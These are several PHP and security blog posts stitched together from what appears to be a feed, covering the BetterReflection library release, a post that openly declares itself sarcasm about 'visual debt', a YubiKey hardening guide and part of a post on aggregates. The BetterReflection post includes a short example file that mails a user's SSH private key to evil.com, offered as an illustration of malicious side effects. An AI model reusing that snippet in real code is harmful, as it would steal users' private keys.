    <a href="https://github.com/Roave/BetterReflection/releases/tag/2.0.0" target="_blank">2.0.0s</a>
    was released today!
</p>

<p>
    I and <a href="http://twitter.com/asgrim" target="_blank">James Titcumb</a> started working on this
    project back in 2015, and it is a pleasure to see it reaching maturity.
</p>

<p>
    The initial idea was simple: James would implement all my wicked ideas, while I
    would lay back and get drunk on Drambuie.
</p>

</p>

<p>
    Yes, that actually happened. Thank you, James, for all the hard work! 🍻

<h3>What the heck is BetterReflection?</h3>

<p>
    Jokes apart, the project is quite ambitious, and it aims at reproducing the entirety of the PHP
    reflection API without having any actual autoloading being triggered.
</p>

<p>
    When put in use, it looks like this:
</p>

<pre><code class="php">&lt;?php

// src/MyClass.php

namespace MyProject;

class MyClass
{
    public function something() {}
}
</code></pre>

<pre><code class="php">&lt;?php

// example1.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\ReflectionMethod;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    -&gt;classReflector()
    -&gt;reflect(MyClass::class);

$methodNames = \array_map(function (ReflectionMethod $method) : string {
    return $method-&gt;getName();
}, $myClass-&gt;getMethods());

\var_dump($methodNames);

// class was not loaded:
\var_dump(\sprintf('Class %s loaded: ', MyClass::class));
\var_dump(\class_exists(MyClass::class, false));
</code></pre>

<p>
    As you can see, the difference is just in how you bootstrap the reflection API.
</p>

<p>
    Also, we do provide a fully backwards-compatible reflection API that you can use
    if your code heavily relies on <code>ext-reflection</code>:
</p>

<pre><code class="php">&lt;?php

// example2.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\Adapter\ReflectionClass;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    -&gt;classReflector()
    -&gt;reflect(MyClass::class);

$reflectionClass = new ReflectionClass($myClass);

// You can just use it wherever you had `ReflectionClass`!
\var_dump($reflectionClass instanceof \ReflectionClass);
\var_dump($reflectionClass-&gt;getName());
</code></pre>

<p>
    How does that work?
</p>

<p>
    The operational concept is quite simple, really:
</p>

<ol>
    <li>
        We scan your codebase for files matching the one containing your class.
        This is fully configurable, but by default we use some ugly autoloader
        hacks to find the file without wasting disk I/O.
    </li>
    <li>
        We feed your PHP file to <a href="https://github.com/nikic/PHP-Parser" target="_blank">PHP-Parser</a>
    </li>
    <li>
        We analyse the produced <abbr title="Abstract Syntax Tree">AST</abbr> and
        wrap it in a matching <code>Roave\BetterReflection\Reflection\*</code>
        class instance, ready for you to consume it.
    </li>
</ol>

<p>
    The hard part is tracking the miriad of details of the PHP language,
    which is very complex and cluttered with scope, visibility and inheritance
    rules: we take care of it for you.
</p>

<h3>Use case scenarios</h3>

<p>
    The main use-cases for BetterReflection are most likely around security, code
    analysis and <abbr title="Ahead of Time">AOT</abbr> compilation.
</p>

<p>
    One of the most immediate use-cases will likely be in
    <a href="https://github.com/phpstan/phpstan" target="_blank">PHPStan</a>, which
    will finally be able to inspect hideous mixed OOP/functional/procedural code
    if <a href="https://github.com/phpstan/phpstan/issues/67" target="_blank">
        the current WIP implementation
    </a> works as expected.
</p>

<p>
    Since you can now "work" with code before having loaded it, you can harden API
    around a lot of security-sensitive contexts. A serializer may decide
    to not load a class if side-effects are contained in the file declaring it:
</p>

<pre><code class="php">&lt;?php

// Evil.php
\mail(
    'haxxor@evil.com',
    'All ur SSH keys are belong to us',
    \file_get_contents('~/.ssh/id_rsa')
);

// you really don't want to autoload this bad one:
class Evil {}
</code></pre>

<p>
    The same goes for classes implementing malicious <code>__destruct</code> code,
    as well as classes that may trigger autoloading of other malicious code.
</p>

<p>
    It is also possible to analyse code that is downloaded from the internet without
    actually running it. For instance, code may be checked against GPG signatures in
    the file signature before being run, effectively allowing PHP to "run only signed code".
    <a href="https://getcomposer.org/" target="_blank">Composer</a>, anybody?
</p>

<p>
    If you are more into code analysis, you may decide to compare two different
    versions of a library, and scan for <abbr title="Backwards Compatibility">BC</abbr>
    breaks:
</p>

<pre><code class="php">&lt;?php
// the-library/v1/src/SomeApi.php

class SomeAPI
{
    public function sillyThings() { /* ... */ }
}
</code></pre>

<pre><code class="php">&lt;?php
// the-library/v2/src/SomeApi.php

class SomeAPI
{
    public function sillyThings(UhOh $bcBreak) { /* ... */ }
}
</code></pre>

<p>
    In this scenario, somebody added a mandatory parameter to <code>SomeAPI#sillyThings()</code>,
    effectively introducing a BC break that is hard to detect without having both versions of the
    code available, or a good migration documentation (library developers: please document this
    kind of change!).
</p>

<p>
    Another way to leverage the power of this factory is to compile factory code into highly 
    optimised dependency injection containers, like
    <a href="https://github.com/PHP-DI/PHP-DI/pull/507" target="_blank">PHP-DI</a> started doing.
</p>

<h3>Future use cases?</h3>

<p>
    In addition to the above use-case scenarios, we are working on additional
    functionality that would allow
    <a href="https://github.com/Roave/BetterReflection/blob/2.0.0/demo/monkey-patching/index.php" target="_blank">
        changing code before loading it
    </a>. 
</p>

<p>
    Is that a good idea?
</p>

<p>
    ... I honestly don't know.
</p>

<p>
    Still, there are proper use-case scenarios around
    <abbr title="Aspect Oriented Programming">AOP</abbr> and proxying libraries,
    which would then be able to work even with <code>final</code> classes.
</p>

<p>
    You will likely see these features appear in a new, separate library.
</p>

            <title type="html"><![CDATA[Eliminating Visual Debt]]></title>
            <link href="https://ocramius.github.io/blog/eliminating-visual-debt/"/>
            <updated>2017-05-29T00:00:00+00:00</updated>
            <id>https://ocramius.github.io/blog/eliminating-visual-debt/</id>
            <content type="html"><![CDATA[<p>
    Today we're talking about <strong>Visual debt</strong> in our code.
</p>

<p>
    As an introduction, I suggest to watch
    <a href="https://laracasts.com/series/php-bits/episodes/1" target="_blank">
        this short tutorial
    </a>
    about visual debt by
    <a href="https://twitter.com/jeffrey_way" target="_blank">@jeffrey_way</a>.
</p>

<p>
    The concept is simple: let's take the example from Laracasts and re-visit
    the steps taken to remove visual debt.
</p>

<pre><code class="php">interface EventInterface {
    public function listen(string $name, callable $handler) : void;
    public function fire(string $name) : bool;
}

final class Event implements EventInterface {
    protected $events = [];

    public function listen(string $name, callable $handler) : void
    {
        $this-&gt;events[$name][] = $handler;
    }

    public function fire(string $name) : bool
    {
        if (! array_key_exists($name, $this-&gt;events)) {
            return false;
        }

        foreach ($this-&gt;events[$name] as $event) {
            $event();
        }

        return true;
    }
}

$event = new Event;

$event-&gt;listen('subscribed', function () {
    var_dump('handling it');
});

$event-&gt;listen('subscribed', function () {
    var_dump('handling it again');
});

$event-&gt;fire('subscribed');
</code></pre>

<p>
    So far, so good.
</p>

<p>
    We have an event that obviously fires itself, a concrete
    implementation and a few subscribers.
</p>

<p>
    Our code works, but it contains a lot of useless artifacts
    that do not really influence our ability to make it run.
</p>

<p>
    These artifacts are also distracting, moving our focus from
    the runtime to the declarative requirements of the code.
</p>

<p>
    Let's start removing the bits that aren't needed by starting
    from the method parameter and return type declarations:
</p>

<pre><code class="php">interface EventInterface {
    public function listen($name, $handler);
    public function fire($name);
}

final class Event implements EventInterface {
    protected $events = [];

    public function listen($name, $handler)
    {
        $this-&gt;events[$name][] = $handler;
    }

    public function fire($name)
    {
        if (! array_key_exists($name, $this-&gt;events)) {
            return false;
        }

        foreach ($this-&gt;events[$name] as $event) {
            $event();
        }

        return true;
    }
}
</code></pre>

<p>
    Our code is obvious, so the parameters don't need
    redundant declarations or type checks. Also, we are
    aware of our own implementation, so the runtime checks
    are not needed, as the code will work correctly as per
    manual or end to end testing. A quick read will also
    provide sufficient proof of correctness.
</p>

<p>
    Since the code is trivial and we know what we are doing
    when using it, we can remove also the contract that
    dictates the intended usage. Let's remove those
    <code>implements</code> and <code>interface</code> symbols.
</p>

<pre><code class="php">final class Event {
    protected $events = [];

    public function listen($name, $handler)
    {
        $this-&gt;events[$name][] = $handler;
    }

    public function fire($name)
    {
        if (! array_key_exists($name, $this-&gt;events)) {
            return false;
        }

        foreach ($this-&gt;events[$name] as $event) {
            $event();
        }

        return true;
    }
}
</code></pre>

<p>
    Removing the contract doesn't change the runtime
    behavior of our code, which is still technically
    correct. Consumers will also not need to worry
    about correctness when they use `Event`, as a
    quick skim over the implementation will reveal
    its intended usage.
</p>

<p>
    Also, since the code imposes no limitations on the
    consumer, who is responsible for the correctness
    of any code touching ours, we are not going to limit
    the usage of inheritance.
</p>

<pre><code class="php">class Event {
    // ... 
}
</code></pre>

<p>
    That's as far as the video goes, with a note that
    the point is to "question everything".
</p>

<h2>Bringing it further</h2>

<p>
    Jeffrey then pushed this a bit further, saying that
    best practices don't exist, and people are pretty
    much copying stale discussions about coding approaches:
</p>

<div data-tweet-id="869265813857075200" class="twitter-tweet"></div>

<p>
    According to that, I'm going to question the naming
    chosen for our code. Since the code is trivial and 
    understandable at first glance, we don't need to pick
    meaningful names for variables, methods and classes:
</p>

<pre><code class="php">class A {
    protected $a = [];

    public function a1($a1, $a2)
    {
        $this-&gt;a[$a1][] = $a2;
    }

    public function a2($a1)
    {
        if (! array_key_exists($a1, $this-&gt;a)) {
            return false;
        }

        foreach ($this-&gt;a[$a1] as $a) {
            $a();
        }

        return true;
    }
}
</code></pre>

<p>
    This effectively removes our need to look at the
    code details, making the code shorter and
    runtime-friendly. We're also saving some space
    in the PHP engine!
</p>

<p>
    Effectively, this shows us that
    there are upsides to this approach, as we move
    from read overhead to less engine overhead. We also
    stop obsessing after the details of our <code>Event</code>,
    as we already previously defined it, so we remember
    how to use it.
</p>

<p>
    Since the <code>Event</code> type is not really useful to us,
    as nothing type-hints against it, we can remove it.
    Let's move back to dealing with a structure of
    function pointers:
</p>

<pre><code class="php">function A () {
    $a = [];

    return [
        function ($a1, $a2) use (&amp; $a) {
            $a[$a1][] = $a2;
        },
        function ($a1) use (&amp; $a) {
            if (! array_key_exists($a1, $a)) {
                return false;
            }

            foreach ($a[$a1] as $a2) {
                $a2();
            }

            return true;
        },
    ];
}


$a = A();

$a[0]('subscribed', function () {
    var_dump('handling it');
});

$a[0]('subscribed', function () {
    var_dump('handling it again');
});

$a[1]('subscribed');
</code></pre>

<p>
    This code is equivalent, and doesn't use any
    particularly fancy structures coming from the PHP
    language, such as classes. We are working
    towards reducing the learning and comprehension
    overhead.
</p>

<h2>Conclusion</h2>

<div data-tweet-id="869277621904912389" class="twitter-tweet"></div>

<p>
    If you haven't noticed before, this entire post
    is just
    <a href="https://www.youtube.com/watch?v=82CtZX9gmZ8" target="_blank">
        sarcasm.
    </a>
</p>

<p>
    Please don't do any of what is discussed above, it
    is a badly crafted oxymoron.
</p>

<p>
    Please don't accept what Jeffrey says in that video.
</p>

<p>
    Please do use type systems when they are available,
    they actually reduce "visual debt" (is it even a thing?),
    helping you distinguish apples from pies.
</p>

<p>
    Please do use interfaces, as they reduce clutter,
    making things easier to follow from a consumer perspective,
    be it a human or an automated tool.
</p>

<p>
    This is all you
    need to understand that <code>Event</code> mumbo-jumbo (which
    has broken naming, by the way, but this isn't an
    architecture workshop). Maybe add some API doc:
</p>

<pre><code class="php">interface EventInterface {
    /**
     * Attach an additional listener to be fired when calling 
     * `fire` with `$name`
     */
    public function listen(string $name, callable $handler) : void;

    /**
     * Execute all listeners assigned to `$name`
     *
     * @return bool whether any listener was executed
     */
    public function fire(string $name) : bool;
}
</code></pre>

<p>
    This is not a really good interface, but it's a clear, simple
    and readable one. No "visual debt". Somebody reading this will
    thank you later. Maybe it will be you, next year.
</p>

<p>
    Please <strong>do</strong> follow best practices.
    <a href="https://www.youtube.com/watch?v=8d2AtAGJPno" target="_blank">
        They work.
        They help you avoiding stupid mistakes.

    <a href="http://www.edn.com/design/automotive/4423428/Toyota-s-killer-firmware--Bad-design-and-its-consequences" target="_blank">
        Bad code can lead to terrible consequences, and you don't know where your code will be used.
    </a>

    <a href="https://www.owasp.org/index.php/" target="_blank">
        OWASP
    </a>
    knows more about all this.
</p>

<p>
    Please remember that your job is reading, understanding and thinking
    before typing, and typing is just a side-effect.
</p>

<p>
    And please, please, please: remember that most of your time you are
    not coding for yourself alone. You are coding for your employer, for
    your team, for your project, for your future self.

            <updated>2017-04-15T00:00:00+00:00</updated>
            <id>https://ocramius.github.io/blog/yubikey-for-ssh-gpg-git-and-local-login/</id>
            <content type="html"><![CDATA[<p>
    I've been using a
    <a href="https://www.yubico.com/products/yubikey-hardware/yubikey-neo/" target="_blank">
        YubiKey Neo
    </a>
    for a bit over two years now, but its usage was limited to
    <abbr title="Two Factor Authentication">2FA</abbr>
    and
    <abbr title="Universal Two Factor Authentication">U2F</abbr>.
</p>

<p>
    Last week, I received my new DELL XPS 15 9560, and since I am maintaining
    some high impact open source projects, I wanted the setup to be well secured.
</p>

<p>
    In addition to that, I caught a bad flu, and that gave me enough excuses
    to waste time in figuring things out.
</p>

<p>
    In this article, I'm going to describe what I did, and how you can reproduce
    my setup for your own safety as well as the one of people that trust you.
</p>

<h2>Yubi-WHAT?</h2>

<p>
    In first place, you should know that I am absolutely not a security expert:
    all I did was following the online tutorials that I found.
    I also am not a cryptography expert, and I am constantly dissatisfied with
    how the crypto community reduces everything into a
    <abbr title="Three Letter Acronym">TLA</abbr>,
    making even the simplest things impossible to understand for mere mortals.
</p>

<p>
    First, let's clarify what a YubiKey is.
</p>

<p>
    <img
        src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/yoshi-yubikey.jpg"
        alt="A YubiKey Neo on a cat"
    />
</p>

<p>
    That thing is a YubiKey.
</p>

<p>
    What does it do?
</p>

<p>
    It's basically an USB key filled with crypto features.
    It also is (currently) impossible to make a physical copy of it,
    and it is not possible to extract information written to it.
</p>

<p>
    It can:
</p>

<ul>
    <li>
        Generate
        <abbr title="Hash Message Authentication Code">HMAC</abbr>
        hashes (kinda)
    </li>
    <li>
        Store
        <abbr title="Gnu Privacy Guard">GPG</abbr>
        private keys
    </li>
    <li>Act as a keyboard that generates time-based passwords</li>
    <li>Generate 2FA time-based login codes</li>
</ul>

<h2>What do we need?</h2>

<p>
    In order to follow this tutorial, you should have at least
    2 (two) YubiKey Neo or equivalent devices. This means that
    you will have to spend approximately USD 100: these things
    are quite expensive. You absolutely need a backup key,
    because all these security measures may lock you out of
    your systems if you lose or damage one.
</p>

<p>
    Our kickass setup will allow us to do a series of cool
    things related to daily development operations:
</p>

<ul>

</p>

<p>
    I am not going to describe the procedures in detail,
    but just link them and describe what we are doing, and
    why.
</p>

<h2>Setting up NFC 2FA</h2>

<p>
    Simple NFC-based 2FA with authentication codes will
    be useful for most readers, even non-technical ones.
</p>

<p>
    What we are doing is simply seed the YubiKey with
    Google Authenticator codes, except that we will
    use the
    <a href="https://play.google.com/store/apps/details?id=com.yubico.yubioath&hl=en" target="_blank">
        Yubico Authenticator
    </a>.
    This will only work for the "primary" key (the one
    we will likely bring with us at all times).
</p>

<p>
    What we will have to do is basically:
</p>

<ol>
    <li>Install some Yubico utility to manage your Yubikey NEO</li>
    <li>
        Plug in your YubiKey and enable
        <abbr title="One Time Password">OTP</abbr>
        and U2F
    </li>
    <li>Install the Yubico Authenticator</li>
    <li>Seed your Yubikey with the 2FA code provided by a compatible website</li>
</ol>

<p>
    The setup steps are described in the official
    <a href="https://www.yubico.com/support/knowledge-base/categories/articles/how-to-use-your-yubikey-with-authenticator-codes/" target="_blank">
        Yubico website
    </a>.
</p>

<p>
    Once the YubiKey is configured with at least one
    <a href="https://twofactorauth.org/" target="_blank">
        website
    </a>
    that supports the "Google Authenticator" workflow,
    we should be able to:
</p>

<ol>
    <li>Open the Yubico Authenticator</li>
    <li>Tap the YubiKey against our phone's NFC sensor</li>
    <li>Use the generated authentication code</li>
</ol>

<p>
    <img
        src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/2fa-codes.jpg"
        alt="Example Yubico Authenticator screen"
    />
</p>

<p>
    One very nice (and unclear, at first) advantage of
    having a YubiKey seeded with 2FA codes is that
    we can now generate 2FA codes on any phone, as long
    as we have our YubiKey with us.
</p>

<p>
    I already had to remote-lock and remote-erase a phone
    in the past, and losing the Google Authenticator settings
    is not fun. If you handle your YubiKey with care, you
    shouldn't have that problem anymore.
</p>

<p class="alert alert-success">
    Also, a YubiKey is water-proof: our 2017 phone probably isn't.
</p>

<h2>Setting up PAM authentication</h2>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span> this procedure
    can potentially lead us to lose <code>sudo</code>
    access from our account, as well as lock us out of our computer.
    I take no responsibility: try it in a
    <abbr title="Virtual Machine">VM</abbr>
    first, if you do not feel confident.
</p>

<p>
    We want to make sure that we can log into our personal
    computer or workstation only when we are physically sitting
    at it. This means that we need the YubiKey must be plugged
    in for a password authentication to succeed.
</p>

<p>
    Each login prompt, user password prompt or <code>sudo</code>
    command should require both our account password and our YubiKey.
</p>

<p>
    What we will have to do is basically:
</p>

<ol>
    <li>Install <code>libpam-yubico</code></li>
    <li>
        Enable some capabilities of our YubiKeys with
        <code>ykpersonalize</code>
    </li>
    <li>
        Generate an initial challenge file for each YubiKey (you
        bought at least 2, right?) with
        <code>ykpamcfg</code>
    </li>
    <li>Deploy the generated files in a root-only accessible path</li>
    <li>
        <span class="label label-warning">IMPORTANT</span>
        start a
        <code>sudo</code>
        session, and be ready to revert changes from there if things go wrong
    </li>
    <li>
        Configure
        <abbr title="Pluggable Authentication Modules">PAM</abbr>
        to also expect a challenge response from a YubiKey (reads:
        a recognized YubiKey must be plugged in when trying to
        authenticate)
    </li>
</ol>

<p>
    The steps to perform that are
    <a href="https://developers.yubico.com/yubico-pam/Authentication_Using_Challenge-Response.html" target="_blank">
        in the official Yubico tutorial
    </a>.
</p>

<p>
    If everything is done correctly, every prompt asking for our
    Linux/Mac account password should fail when no YubiKey is plugged
    in.
</p>

<p class="alert alert-info">
    <span class="label label-info">TIP:</span> configure the
    libpam-yubico integration in debug mode, as we will often
    have a "WTH?" reaction when authentication isn't working.
    That may happen if there are communication errors with the
    YubiKey.
</p>

<p>
    This setup has the advantage of locking out anyone trying to
    bruteforce our password, as well as stopping potentially malicious
    background programs from performing authentication or
    <code>sudo</code>
    commands while we aren't watching.
</p>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span> the point
    of this sort of setup is to guarantee that login can only
    happen with the physical person at the computer. If we want
    to go to the crapper, we lock lock computer, and bring our
    YubiKey with us.
</p>

<h2>Setting up GPG</h2>

<p>
    This is probably the messiest part of the setup, as a lot of
    CLI tool usage is required.
</p>

<p>
    Each YubiKey has the ability to store 3 separate keys for
    <i>signing</i>, <i>encrypting</i> and <i>authenticating</i>.
</p>

<p>
    We will therefore create a series of GPG keys:
</p>

<ol>
    <li>A GPG master key (if we don't already have a GPG key)</li>
    <li>
        A sub-key for signing (marked
        <code>[S]</code>
        in the gpg interactive console)
    </li>
    <li>
        A sub-key for encrypting (marked
        <code>[E]</code>
        in the gpg interactive console)
    </li>
    <li>
        A sub-key for authenticating (marked
        <code>[A]</code>
        in the gpg interactive console)
    </li>
    <li>
        Generate these 3 sub-keys for each YubiKey
        we have (3 keys per YubiKey)
    </li>
</ol>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span> as far as I know,
    the YubiKey Neo only supports RSA keys up to <code>2048</code> long.
    Do not use <code>4096</code> for the sub-key length unless we know
    that the key type supports it.
</p>

<p>
    After that, we will move the private keys to the YubiKeys
    with the <code>gpg</code> <code>keytocard</code> command.
</p>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span> the
    <code>keytocard</code> command is destructive. Once we moved
    a private key to a YubiKey, it is removed from our local
    machine, and it cannot be recovered. Be sure to only move
    the correct sub-keys.
</p>

<p class="alert alert-info">
    <span class="label label-info">NOTE:</span> being unable
    to recover the private sub-key is precisely the
    point of using a YubiKey: nobody can steal or misuse that
    keys, no malicious program can copy it, plus we can use
    it from any workstation.
</p>

<p>
    Also, we will need to set a
    <strong>PIN</strong>
    and an
    <strong>admin PIN</strong>.
    These defaults for these two are respectively
    <code>123456</code>
    and
    <code>12345678</code>.
    The
    <strong>PIN</strong>
    will be needed each time we plug in we YubiKey to use
    any of the private keys stored in it.
</p>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span>
    we only have
    <code>3</code>
    attempts for entering our PIN. Should we fail all
    attempts, then the YubiKey will be locked, and we
    will have to move new GPG sub-keys to it before being
    able to use it again. This prevents
    bruteforcing after physical theft.
</p>

<p>
    After our gpg sub-keys and PINs are written to the
    YubiKeys, let's make a couple of secure backups of our master
    gpg secret key. Then delete it from the computer  Keep
    just the public key.
</p>

<p>
    The master private gpg key should only be used to generate
    new sub-keys, if needed, or to revoke them, if we lose
    one or more of our physical devices.
</p>

<p>
    We should now be able to:
</p>

<ul>
    <li>
        Sign messages with the signing key stored in our
        YubiKey (only if plugged in) and its PIN
    </li>
    <li>
        Verify those messages with the master public key
    </li>
    <li>
        Encrypt messages with the master public key
    </li>
    <li>
        Decrypt messages with the encryption key stored in
        the YubiKey (only if plugged in) and its PIN
    </li>
</ul>

<p>
    The exact procedure to achieve all this is described
    in detail (with console output and examples) at
    <a href="https://github.com/drduh/YubiKey-Guide/tree/1ad37577db92726eadde4dc302a6f982ba7e82dc">
        drduh/YubiKey-Guide
    </a>.
</p>

<h2>GIT commit signing</h2>

<p>
    Now that we can sign messages using the GPG key stored
    in our YubiKey, usage with GIT becomes trivial:
</p>

<p>
    <code>git config --global user.signingkey=&lt;yubikey-signing-sub-key-id&gt;</code>
</p>

<p>
    We will now need to plug in our YubiKey and enter our
    PIN when signing a tag:
</p>

<p>
    <code>git tag -s this-is-a-signed-tag -m "foo"</code>
</p>

<p class="alert alert-success">
    Nobody can release software on our behalf without physical
    access to our YubiKey, as well as our YubiKey PIN.
</p>

<h2>Signing/Encrypting email messages</h2>

<p>
    In order to sign/encrypt emails, we will need to install
    <a href="https://www.mozilla.org/en-US/thunderbird/" target="_blank">
        Mozilla Thunderbird
    </a>
    and
    <a href="https://www.enigmail.net/index.php/en/" target="_blank">
        Enigmail
    </a>.
</p>

<p>
    The setup will crash a few times. I suggest going through the
    "advanced" settings, then actually selecting a signing/encryption
    key when trying to send a signed/encrypted message. Enigmail
    expects the key to be a file or similar, but this approach
    will allow us to just give it the private GPG key identifier.
</p>

<p>
    Sending mails is still a bit buggy: Thunderbird will ask for the
    pin 3 times, as if it failed to authenticate, but the third attempt
    will actually succeed. This behavior will be present in a number of
    prompts, not just within Thunderbird.
</p>

<p class="alert alert-success">
    <span class="label label-success">!</span>
    Nobody can read our encrypted emails, unless the YubiKey
    is plugged in. If our laptop is stolen, these secrets will be
    protected.
</p>

<h2>SSH authentication</h2>

<p>
    There is one GPG key that we didn't use yet:
    the authentication one.
</p>

<p>
    There is a (relatively) recent functionality of
    <code>gpg-agent</code>
    that allows it to behave as an
    <code>ssh-agent</code>.
</p>

<p>
    To make that work, we will simply kill all existing
    SSH and GPG agents:
</p>

<pre><code class="sh">sudo killall gpg-agent
sudo killall ssh-agent
# note: eval is used because the produced STDOUT is a bunch of ENV settings
eval $( gpg-agent --daemon --enable-ssh-support )
</code></pre>

<p>
    Once we've done that, let's try running:
</p>

<p>
    <code>ssh-add -L</code>
</p>

<p>
    Assuming we don't have any local SSH keys, the output
    should be something like:
</p>

<pre><code>ocramius@ocramius-XPS-15-9560:~$ ssh-add -L
The agent has no identities.
</code></pre>

<p>
    If we plug in our YubiKey and try again,
    the output will be:
</p>

<pre><code>ocramius@ocramius-XPS-15-9560:~$ ssh-add -L
ssh-rsa AAAAB3NzaC ... pdqtlwX6m1 cardno:000123457915
</code></pre>

<p>
    MAGIC! <code>gpg-agent</code> is exposing the public GPG key as
    an SSH key.
</p>

<p>
    If we upload this public key to a server, and then
    try logging in with the YubiKey plugged in, we will
    be asked for the YubiKey PIN, and will then just be able
    to log in as usual.
</p>

<p class="alert alert-success">
    Nobody can log into our remote servers without having
    the physical key device.
</p>

<p class="alert alert-success">
    We can log into our remote servers from any computer
    that can run gpg-agent. Just always bring our YubiKey with
    ourselves.
</p>

<p class="alert alert-warning">
    <span class="label label-warning">CAUTION:</span>
    Each YubiKey with an authentication gpg sub-key
    will produce a different public SSH key: we will
    need to seed our server with all the SSH public keys.
</p>

<p class="alert alert-info">
    <span class="label label-info">TIP:</span>
    consider using the YubiKey identifier (written on
    the back of the device) as the comment for the
    public SSH key, before storing it.
</p>

<p>
    Steps to set up <code>gpg-agent</code> for SSH authentication
    are also detailed in
    <a href="https://github.com/drduh/YubiKey-Guide/tree/1ad37577db92726eadde4dc302a6f982ba7e82dc">
        drduh/YubiKey-Guide
    </a>.
</p>

<p>
    Custom SSH keys are no longer needed: our GPG keys cover
    most usage scenarios.
</p>

<h2>Conclusion</h2>

<p>
    We now have at least 2 physical devices that give
    us access to very critical parts of our infrastructure,
    messaging, release systems and computers in general.
</p>

<p>
    At this point, I suggest keeping one always with ourselves,
    and treating it with extreme care. I made a custom
    <a href="https://www.thingiverse.com/thing:532575" target="_blank">
        3d-printed case for my YubiKey
    </a>, and then put it all together in my physical keychain:
</p>

<p>
    <img
        src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/physical-keychain.jpg"
        alt="My physical keychain"
    />
</p>

<p>
    The backup key is to be kept in a secure location: while
    theft isn't a big threat with YubiKeys, getting locked
    out of all our systems is a problem. Make sure that you can
    always either recover a YubiKey or the master GPG key.

            <id>https://ocramius.github.io/blog/on-aggregates-and-external-context-interactions/</id>
            <content type="html"><![CDATA[<p>
    Some time ago, I was asked where I put I/O operations when dealing with
    aggregates.
</p>

<div data-tweet-id="808545609468801024" class="twitter-tweet"></div>

<p>
    The context was a <abbr title="command query responsibility segregation">CQRS</abbr>
    and Event Sourced architecture, but in general, the approach that I prefer also applies to most
    imperative ORM entity code (assuming a proper data-mapper is involved).
</p>

<h3>Scenario</h3>

<p>
    Let's use a practical example:
</p>

<pre><code class="gherkin">Feature: credit card payment for a shopping cart checkout

  Scenario: a user must be able to check out a shopping cart
    Given the user has added some products to their shopping cart
    When the user checks out the shopping cart with their credit card
    Then the user was charged for the shopping cart total price

  Scenario: a user must not be able to check out an empty shopping cart
    When the user checks out the shopping cart with their credit card
    Then the user was not charged

  Scenario: a user cannot check out an already purchased shopping cart
    Given the user has added some products to their shopping cart
    And the user has checked out the shopping cart with their credit card
    When the user checks out the shopping cart with their credit card
    Then the user was not charged
</code></pre>

<p>
    The scenario is quite generic, but you should be able to see what the application is supposed to do.
</p>

<h3>An initial implementation</h3>

<p>
    I will take an imperative command + domain-events approach, but we don't need to
    dig into the patterns behind it, as it is quite simple.
</p>

<p>
    We are looking at a command like following:
</p>

<pre><code class="php">final class CheckOutShoppingCart
{
    public static function from(
        CreditCardCharge $charge,
        ShoppingCartId $shoppingCart
    ) : self {
        // ...
    }

    public function charge() : CreditCardCharge { /* ... */ }
    public function shoppingCart() : ShoppingCartId { /* ... */ }
}
</code></pre>

<p>
    If you are unfamiliar with what a
    <abbr title="A command is a value object that encapsulates the intent and parameters of our business interaction">command</abbr>
    is, it is just the object that our frontend or API throws at our actual
    application logic.
</p>

<p>
    Then there is an aggregate performing the actual domain logic work:
</p>

<pre><code class="php">final class ShoppingCart
{
    // ... 

    public function checkOut(CapturedCreditCardCharge $charge) : void
    {
        $this-&gt;charge = $charge;

        $this-&gt;raisedEvents[] = ShoppingCartCheckedOut::from(
            $this-&gt;id,
            $this-&gt;charge
        );
    }

    // ... 
}
</code></pre>

<p>
    If you are unfamiliar with what an <i>aggregate</i> is,
    it is the direct object in our interaction (look at the
    sentences in the scenario).
    In your existing applications, it would most likely (but not exclusively)
    be an entity or a DB record or group of entities/DB records that you
    are considering during a business interaction.
</p>

<p>
    We need to glue this all together with a command handler:
</p>

<pre><code class="php">final class HandleCheckOutShoppingCart
{
    public function __construct(Carts $carts, PaymentGateway $gateway)
    {
        $this-&gt;carts   = $carts;
        $this-&gt;gateway = $gateway;
    }

    public function __invoke(CheckOutShoppingCart $command) : void
    {
        $shoppingCart = $this-&gt;carts-&gt;get($command-&gt;shoppingCart());

        $payment = $this-&gt;gateway-&gt;captureCharge($command-&gt;charge());

        $shoppingCart-&gt;checkOut($payment);
    }
}
</code></pre>

<p>
    This covers the "happy path" of our workflow, but we still lack:
</p>

<ul>
    <li>The ability to check whether the payment has already occurred</li>
    <li>Preventing payment for empty shopping carts</li>
    <li>Preventing payment of an incorrect amount</li>
    <li>Handling of critical failures on the payment gateway</li>
</ul>

<p>
    In order to do that, we have to add some "guards" that prevent the interaction.
    This is the approach that I've seen being used in the wild:
</p>

<pre><code class="php">final class HandleCheckOutShoppingCart
{
    // ... 

    public function __invoke(CheckOutShoppingCart $command) : void
    {
        $cartId = $command-&gt;shoppingCart();
        $charge = $command-&gt;charge();

        $shoppingCart = $this-&gt;carts-&gt;get($cartId);

        // these guards are injected callables. They throw exceptions:
        ($this-&gt;nonEmptyShoppingCart)($cartId);
        ($this-&gt;nonPurchasedShoppingCart)($cartId);
        ($this-&gt;paymentAmountMatches)($cartId, $charge-&gt;amount());

        $payment = $this-&gt;gateway-&gt;captureCharge($charge);

        $shoppingCart-&gt;checkOut($payment);
    }
}
</code></pre>

<p>
    As you can see, we are adding some logic to our command handler here.
    This is usually done because dependency injection on the command handler
    is easy.
    
    Passing services to the aggregate via dependency injection is generally
    problematic and to be avoided, since an aggregate is usually a 
    <a href="http://misko.hevery.com/2008/09/30/to-new-or-not-to-new/" target="_blank">"newable type"</a>.
</p>

<p>
    With this code, we are able to handle most unhappy paths, and eventually
    also failures of the payment gateway (not in this article).
</p>

<h3>The problem</h3>

<p>
    While the code above works, what we did is adding some domain-specific logic
    to the command handler. Since the command handler is part of our application
    layer, we are effectively diluting these checks into "less important layers". 
</p>

<p>
    In addition to that, the command handler is required in tests
    that consume the above specification: without the command handler, our logic
    will fail to handle the unhappy paths in our scenarios.
